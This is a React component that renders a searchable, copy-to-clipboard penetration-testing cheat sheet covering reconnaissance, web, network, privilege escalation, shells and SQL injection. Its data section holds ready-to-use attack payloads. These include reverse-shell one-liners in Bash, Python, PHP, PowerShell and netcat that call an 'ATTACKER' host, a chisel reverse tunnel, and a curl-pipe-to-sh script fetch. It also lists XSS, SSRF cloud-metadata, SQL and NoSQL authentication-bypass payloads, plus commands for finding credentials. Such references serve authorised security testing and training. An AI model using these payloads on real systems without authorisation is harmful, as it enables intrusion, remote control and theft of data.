import { useState } from "react";
import { motion } from "framer-motion";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Search, Copy, CheckCircle2, Terminal, Globe, Database, Shield, Wifi, Server, Code } from "lucide-react";
import { cn } from "@/lib/utils";

const categories = [
  { id: "recon", label: "Recon", icon: Globe },
  { id: "web", label: "Web", icon: Code },
  { id: "network", label: "Network", icon: Wifi },
  { id: "privesc", label: "PrivEsc", icon: Shield },
  { id: "shells", label: "Shells", icon: Terminal },
  { id: "sqli", label: "SQLi", icon: Database },
];

const cheatSheets: Record<string, Array<{ title: string; commands: Array<{ desc: string; cmd: string }> }>> = {
  recon: [
    { title: "Subdomain Enumeration", commands: [
      { desc: "Subfinder", cmd: "subfinder -d target.com -all -silent | sort -u" },
      { desc: "Amass", cmd: "amass enum -passive -d target.com -o subdomains.txt" },
      { desc: "HTTPX probe", cmd: "cat subdomains.txt | httpx -silent -status-code -title" },
      { desc: "DNS brute force", cmd: "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" },
    ]},
    { title: "Technology Fingerprinting", commands: [
      { desc: "Wappalyzer CLI", cmd: "wappalyzer https://target.com" },
      { desc: "WhatWeb", cmd: "whatweb -a 3 https://target.com" },
      { desc: "Nuclei tech detect", cmd: "nuclei -u https://target.com -t technologies/" },
    ]},
    { title: "Google Dorking", commands: [
      { desc: "Find subdomains", cmd: 'site:target.com -www' },
      { desc: "Exposed files", cmd: 'site:target.com filetype:pdf OR filetype:doc OR filetype:xlsx' },
      { desc: "Login pages", cmd: 'site:target.com inurl:login OR inurl:admin OR inurl:dashboard' },
      { desc: "Config files", cmd: 'site:target.com ext:env OR ext:yml OR ext:config' },
      { desc: "S3 buckets", cmd: 'site:s3.amazonaws.com "target"' },
    ]},
  ],
  web: [
    { title: "XSS Payloads", commands: [
      { desc: "Basic reflected", cmd: '<script>alert(document.domain)</script>' },
      { desc: "IMG tag", cmd: '<img src=x onerror=alert(1)>' },
      { desc: "SVG tag", cmd: '<svg onload=alert(1)>' },
      { desc: "Event handler", cmd: '" autofocus onfocus=alert(1) //' },
      { desc: "Polyglot", cmd: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//" },
    ]},
    { title: "SSRF Payloads", commands: [
      { desc: "Localhost bypass", cmd: "http://127.0.0.1 | http://0x7f000001 | http://[::1]" },
      { desc: "AWS metadata", cmd: "http://169.254.169.254/latest/meta-data/" },
      { desc: "GCP metadata", cmd: "http://metadata.google.internal/computeMetadata/v1/" },
      { desc: "DNS rebinding", cmd: "http://1.1.1.1.nip.io → resolves to 1.1.1.1" },
    ]},
    { title: "Directory Discovery", commands: [
      { desc: "Feroxbuster", cmd: "feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
      { desc: "FFUF", cmd: "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403" },
      { desc: "Gobuster", cmd: "gobuster dir -u https://target.com -w wordlist.txt -x php,html,js" },
    ]},
  ],
  network: [
    { title: "Nmap Scanning", commands: [
      { desc: "Fast scan", cmd: "nmap -sC -sV -O -T4 target.com" },
      { desc: "Full port scan", cmd: "nmap -p- -T4 --min-rate=1000 target.com" },
      { desc: "UDP scan", cmd: "nmap -sU --top-ports 100 target.com" },
      { desc: "Vuln scan", cmd: "nmap --script vuln target.com" },
      { desc: "Stealth scan", cmd: "nmap -sS -Pn -f --data-length 200 target.com" },
    ]},
    { title: "Network Pivoting", commands: [
      { desc: "SSH tunnel", cmd: "ssh -D 9050 user@pivot -N" },
      { desc: "Chisel server", cmd: "chisel server -p 8080 --reverse" },
      { desc: "Chisel client", cmd: "chisel client ATTACKER:8080 R:socks" },
      { desc: "Ligolo-ng", cmd: "ligolo-ng -selfcert" },
    ]},
  ],
  privesc: [
    { title: "Linux Privilege Escalation", commands: [
      { desc: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
      { desc: "SUID binaries", cmd: "find / -perm -4000 -type f 2>/dev/null" },
      { desc: "Writable /etc/passwd", cmd: "ls -la /etc/passwd /etc/shadow" },
      { desc: "Sudo permissions", cmd: "sudo -l" },
      { desc: "Cron jobs", cmd: "cat /etc/crontab && ls -la /etc/cron.d/" },
      { desc: "Capabilities", cmd: "getcap -r / 2>/dev/null" },
    ]},
    { title: "Windows Privilege Escalation", commands: [
      { desc: "WinPEAS", cmd: "winpeas.exe" },
      { desc: "Check privileges", cmd: "whoami /priv" },
      { desc: "Unquoted service paths", cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"' },
      { desc: "AlwaysInstallElevated", cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { desc: "Stored credentials", cmd: "cmdkey /list" },
    ]},
  ],
  shells: [
    { title: "Reverse Shells", commands: [
      { desc: "Bash", cmd: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" },
      { desc: "Python", cmd: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" },
      { desc: "PHP", cmd: "php -r '$s=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { desc: "PowerShell", cmd: "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}" },
      { desc: "Netcat", cmd: "nc -e /bin/sh ATTACKER 4444" },
    ]},
    { title: "Shell Stabilization", commands: [
      { desc: "Python PTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
      { desc: "Upgrade TTY", cmd: "stty raw -echo; fg" },
      { desc: "Export TERM", cmd: "export TERM=xterm && export SHELL=bash" },
    ]},
  ],
  sqli: [
    { title: "SQL Injection", commands: [
      { desc: "Auth bypass", cmd: "' OR 1=1--\n' OR 1=1#\nadmin'--" },
      { desc: "Union-based", cmd: "' UNION SELECT null,null,null--\n' UNION SELECT 1,username,password FROM users--" },
      { desc: "Error-based", cmd: "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--" },
      { desc: "Time-based blind", cmd: "' AND IF(1=1,SLEEP(5),0)--\n'; WAITFOR DELAY '0:0:5'--" },
      { desc: "SQLMap", cmd: "sqlmap -u 'https://target.com/page?id=1' --dbs --batch" },
    ]},
    { title: "NoSQL Injection", commands: [
      { desc: "MongoDB bypass", cmd: '{"username": {"$ne": ""}, "password": {"$ne": ""}}' },
      { desc: "Regex DoS", cmd: '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}' },
      { desc: "JS injection", cmd: '{"$where": "this.username == \'admin\'"}' },
    ]},
  ],
};

export default function SecurityCheatSheets() {
  const [search, setSearch] = useState("");
  const [copied, setCopied] = useState<string | null>(null);
  const [activeCategory, setActiveCategory] = useState("recon");

  const copyCmd = (cmd: string) => {
    navigator.clipboard.writeText(cmd);
    setCopied(cmd);
    setTimeout(() => setCopied(null), 2000);
  };

  const filteredSheets = cheatSheets[activeCategory]?.filter(sheet =>
    !search || sheet.title.toLowerCase().includes(search.toLowerCase()) ||
    sheet.commands.some(c => c.desc.toLowerCase().includes(search.toLowerCase()) || c.cmd.toLowerCase().includes(search.toLowerCase()))
  ) || [];

  return (
    <div className="space-y-4">
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
        <Input placeholder="Search commands, tools, payloads..." value={search} onChange={e => setSearch(e.target.value)} className="pl-10 h-11 bg-card border-border font-mono text-sm" />
      </div>

      <Tabs value={activeCategory} onValueChange={setActiveCategory}>
        <TabsList className="w-full flex bg-card border border-border rounded-xl p-1 h-auto">
          {categories.map(c => (
            <TabsTrigger key={c.id} value={c.id} className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg text-xs font-semibold">
              <c.icon className="h-3.5 w-3.5" />
              <span className="hidden sm:inline">{c.label}</span>
            </TabsTrigger>
          ))}
        </TabsList>

        {Object.keys(cheatSheets).map(cat => (
          <TabsContent key={cat} value={cat}>
            <ScrollArea className="h-[550px]">
              <div className="space-y-4">
                {filteredSheets.map((sheet, si) => (
                  <motion.div key={si} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: si * 0.05 }}>
                    <Card className="border-border bg-card">
                      <CardHeader className="pb-2">
                        <CardTitle className="text-sm flex items-center gap-2">
                          <Terminal className="h-4 w-4 text-primary" />
                          {sheet.title}
                        </CardTitle>
                      </CardHeader>
                      <CardContent className="space-y-2">
                        {sheet.commands.map((cmd, ci) => (
                          <div key={ci} className="group flex items-start gap-2 p-2 rounded-lg hover:bg-muted/50 transition-colors">
                            <div className="flex-1 min-w-0">
                              <span className="text-xs text-muted-foreground">{cmd.desc}</span>
                              <pre className="text-xs font-mono text-foreground mt-0.5 whitespace-pre-wrap break-all">{cmd.cmd}</pre>
                            </div>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-7 w-7 p-0 opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                              onClick={() => copyCmd(cmd.cmd)}
                            >
                              {copied === cmd.cmd ? <CheckCircle2 className="h-3.5 w-3.5 text-success" /> : <Copy className="h-3.5 w-3.5" />}
                            </Button>
                          </div>
                        ))}
                      </CardContent>
                    </Card>
                  </motion.div>
                ))}
              </div>
            </ScrollArea>
          </TabsContent>
        ))}
      </Tabs>
    </div>
  );
}
